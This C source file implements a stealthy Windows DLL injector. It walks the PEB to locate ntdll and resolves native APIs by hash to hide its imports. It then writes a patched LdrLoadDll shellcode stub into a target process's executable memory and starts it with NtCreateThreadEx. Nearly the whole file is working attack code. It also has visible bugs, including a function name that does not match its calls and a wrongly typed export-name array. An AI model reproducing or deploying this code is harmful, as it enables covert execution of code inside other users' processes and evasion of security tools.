#include<injection.h>

// Hash function
DWORD HashStringA_Djb2(const char* str){
    DWORD hash = 5381;
    unsigned char c;
    while ((c = (unsigned char)*str++)) { 
        if (c >= 'A' && c <= 'Z') c += 32; // Convert uppercase to lowercase
        hash = ((hash << 5) + hash) + c; // hash * 33 + c
    }
    return hash;
}

// PEB Traversal: Get the base address of ntdll.dll by traversing the PEB's InMemoryOrderModuleList
PVOID GetNtDllBaseAddress(){
    // 1. Get the PEB address: On x64, PEB loacates at GS:[0x60]
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    
    // 2. Get the module list from the PEB: The Ldr field of the PEB points to the PEB_LDR_DATA structure, which contains the InMemoryOrderModuleList
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    
    // 3. Browse the InMemoryOrderModuleList to find the base address of ntdll.dll 
    // The InMemoryOrderModuleList is a doubly linked list of LDR_DATA_TABLE_ENTRY structures, each representing a loaded module. 
    // The first entry (Flink) is always the executable (.exe) of our process, and the second entry (Flink of the first entry) is always ntdll.dll, and the third entry (Flink of the second entry) is always kernel32.dll.
    PLDR_DATA_TABLE_ENTRY pExeEntry = (PLDR_DATA_TABLE_ENTRY)pLdr->InMemoryOrderModuleList.Flink;
    
    // 4. Get the base address of ntdll.dll from the second entry in the list
    PLDR_DATA_TABLE_ENTRY pNtdllEntry = (PLDR_DATA_TABLE_ENTRY)pExeEntry->InMemoryOrderLinks.Flink;
    
    // 5. Return the base address of ntdll.dll
    return pNtdllEntry->DllBase;
}

// Resolve API by hash
PVOID GetProcAddress(HMODULE hModule, DWORD dwTargetHash) {
    PBYTE pBase = (PBYTE)GetNtDllBaseAddress();
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBase;
    if(pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);
    if(pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_DATA_DIRECTORY exportDir = pNtHeaders -> OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportDir.VirtualAddress);
    PWORD pdwNames = (PWORD)(pBase + pExportDir->AddressOfNames);
    PWORD pwOrdinals = (PWORD)(pBase + pExportDir->AddressOfNameOrdinals);
    PDWORD pdwFunctions = (PDWORD)(pBase + pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* szFuncName = (char*)(pBase + pdwNames[i]);
        if (HashStringA_Djb2(szFuncName) == dwTargetHash) {
            DWORD funcRva = pdwFunctions[pwOrdinals[i]];
            // Check Forwarded Export
            if (funcRva >= exportDir.VirtualAddress && funcRva < (exportDir.VirtualAddress + exportDir.Size)) {
                return NULL;
            }
            return (PVOID)(pBase + funcRva);
        }
    }
    return NULL;
}


/*
-- X64 shellcode for LdrLoadDll: Because NtCreateThreadEx just accepts 1 argument, 
-- we need to create a shellcode stub to call LdrLoadDll with 4 arguments, 
-- and we will patch the shellcode with the correct addresses at runtime.
xor rcx, rcx (DllPath = NULL)
xor rdx, rdx (DllCharacteristics = NULL)
mov r8, <ADDR_OF_UNICODE_STRING>  (Will be patched at runtime)
mov r9, <ADDR_OF_DLL_HANDLE>      (Will be patched at runtime)
mov rax, <ADDR_OF_LdrLoadDll>     (Will be patched at runtime)
call rax
ret
*/
unsigned char shellcode[] = {
    0x48, 0x31, 0xC9,                   // xor rcx, rcx
    0x48, 0x31, 0xD2,                   // xor rdx, rdx
    0x49, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r8, imm64 (Offset 8)
    0x49, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r9, imm64 (Offset 18)
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, imm64 (Offset 28)
    0xFF, 0xD0,                         // call rax
    0xC3
};

BOOL Injection(_In_ CONST HANDLE PID, _In_ LPCWSTR DLLPath, _In_ CONST SIZE_T PathSize){
    NTSTATUS status =  0;
    SIZE_T bytewritten = 0;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID pRemoteDllPath = NULL;
    PVOID pRemoteUniString = NULL;
    PVOID pRemoteDllHandle = NULL;
    PVOID pRemoteShellcode = NULL;
    _OBJECT_ATTRIBUTES objattr = { sizeof(objattr) , NULL, NULL, 0, NULL, NULL };
    _CLIENT_ID clientid = { (HANDLE)(ULONG_PTR)PID, NULL };

// Resolve NTAPI functions by hash
    HMODULE hNtdll = GetNtDllBaseAddress();
    fn_NtOpenProcess pNtOpenProcess = (fn_NtOpenProcess)GetProcAddressByHash(hNtdll, 0x31059255); // "ntopenprocess"
    fn_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)GetProcAddressByHash(hNtdll, 0xc66d2fcc); // "ntallocatevirtualmemory"
    fn_NtWriteVirtualMemory pNtWriteVirtualMemory = (fn_NtWriteVirtualMemory)GetProcAddressByHash(hNtdll, 0x25801e7a); // "ntwritevirtualmemory"
    fn_NtCreateThreadEx pNtCreateThreadEx = (fn_NtCreateThreadEx)GetProcAddressByHash(hNtdll, 0x81731111); // "ntcreatethreadex"
    fn_NtWaitForSingleObject pNtWaitForSingleObject = (fn_NtWaitForSingleObject)GetProcAddressByHash(hNtdll, 0x6e7c8b5d); // "ntwaitforsingleobject"
    fn_NtClose pNtClose = (fn_NtClose)GetProcAddressByHash(hNtdll, 0x31c2e16a); // "ntclose"
    fn_NtFreeVirtualMemory pNtFreeVirtualMemory = (fn_NtFreeVirtualMemory)GetProcAddressByHash(hNtdll, 0x0c6a2f1b); // "ntfreevirtualmemory"
    fn_LdrLoadDll pLdrLoadDll = (fn_LdrLoadDll)GetProcAddressByHash(hNtdll, 0x329156f3); // "ldrloaddll"

    if (!pNtOpenProcess || !pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtCreateThreadEx || !pLdrLoadDll) {
        return FALSE;
    }

// NtOpenProcess
    status = pNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objattr, &clientid);
    if (status != STATUS_SUCCESS || !hProcess) goto CLEAN_UP;

// NtAllocateVirtualMemory (for DLL Path)
    status = pNtAllocateVirtualMemory(hProcess, &pRemoteDllPath, 0, &PathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != STATUS_SUCCESS) goto CLEAN_UP;

// NtWriteVirtualMemory (Write DLL Path)
    status = pNtWriteVirtualMemory(hProcess, pRemoteDllPath, (PVOID)DLLPath, PathSize, &bytewritten);
    if (status != STATUS_SUCCESS) goto CLEAN_UP;

// NtAllocateVIrtualMemory (for UNICODE_STRING)
    SIZE_T string_size = sizeof(_UNICODE_STRING);
    status = pNtAllocateVirtualMemory(hProcess, &pRemoteUniString, 0, &string_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != STATUS_SUCCESS) goto CLEAN_UP;

    _UNICODE_STRING plocalUniString;
    plocalUniString.Length = (USHORT)(PathSize - sizeof(WCHAR)); // Exclude null terminator
    plocalUniString.MaximumLength = (USHORT)PathSize;
    plocalUniString.Buffer = (PWSTR)pRemoteDllPath;

    status = pNtWriteVirtualMemory(hProcess, pRemoteUniString, &plocalUniString, sizeof(_UNICODE_STRING), &bytewritten);
    if (status != STATUS_SUCCESS) goto CLEAN_UP;

// Allocate memory for LdrLoadDll to write output of DllHandle
    SIZE_T handle_size = sizeof(PVOID);
    status = pNtAllocateVirtualMemory(hProcess, &pRemoteDllHandle, 0, &PathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != STATUS_SUCCESS) goto CLEAN_UP;

// Path shellcode stub with dynamic addresses
// Patch R8 (Offset R8): Adress of UNICODE_STRING in remote process
    *(PVOID*)(shellcode + 8) = pRemoteUniString;
// Patch R9 (Offset R9): Address to store DllHandle in remote process
    *(PVOID*)(shellcode + 18) = pRemoteDllHandle;
// Patch RAX (Offset RAX): Address of LdrLoadDll in local process
    *(PVOID*)(shellcode + 28) = pLdrLoadDll;

// Write patched shellcode to remote memory
    status = pNtAllocateVirtualMemory(hProcess, &pRemoteShellcode, 0, &PathSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS) goto CLEAN_UP;

    status = pNtWriteVirtualMemory(hProcess, pRemoteShellcode, shellcode, sizeof(shellcode), &bytewritten);
    if (status != STATUS_SUCCESS) goto CLEAN_UP;

// NtCreateThreadEx (Create remote thread to execute shellcode)
    status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteShellcode, NULL, 0, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS || !hThread) goto CLEAN_UP;

// NtWaitForSingleObject (Wait for remote thread to finish)
    status = pNtWaitForSingleObject(hThread, FALSE, NULL);
    if (status != STATUS_SUCCESS) goto CLEAN_UP;
    
CLEAN_UP:
    if (pRemoteShellcode) {
        SIZE_T freeSize = 0;
        pNtFreeVirtualMemory(hProcess, &pRemoteShellcode, &freeSize, MEM_RELEASE);
    }
    if (pRemoteDllHandle) {
        SIZE_T freeSize = 0;
        pNtFreeVirtualMemory(hProcess, &pRemoteDllHandle, &freeSize, MEM_RELEASE);
    }
    if (pRemoteUniString) {
        SIZE_T freeSize = 0;
        pNtFreeVirtualMemory(hProcess, &pRemoteUniString, &freeSize, MEM_RELEASE);
    }
    if (pRemoteDllPath) {
        SIZE_T freeSize = 0;
        pNtFreeVirtualMemory(hProcess, &pRemoteDllPath, &freeSize, MEM_RELEASE);
    }
    if (hThread) pNtClose(hThread);
    if (hProcess) pNtClose(hProcess);

    return (status == STATUS_SUCCESS);
}